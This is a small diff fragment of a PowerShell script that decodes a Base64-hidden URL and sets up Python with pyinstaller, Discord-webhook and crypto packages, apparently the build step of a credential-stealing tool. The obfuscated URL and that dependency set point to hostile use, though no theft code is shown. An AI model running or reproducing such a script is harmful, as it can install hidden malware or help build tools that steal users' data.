@@ -25,3 +25,4 @@ try{$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9y
 & "$pythonInstallDir\python.exe" -m venv venv
 & "$(Get-Location)\venv\Scripts\python.exe" -m pip install pyinstaller==4.2 cryptography==36.0.1 discord_webhook pycryptodome pypiwin32 cryptography==36.0.1
 
+
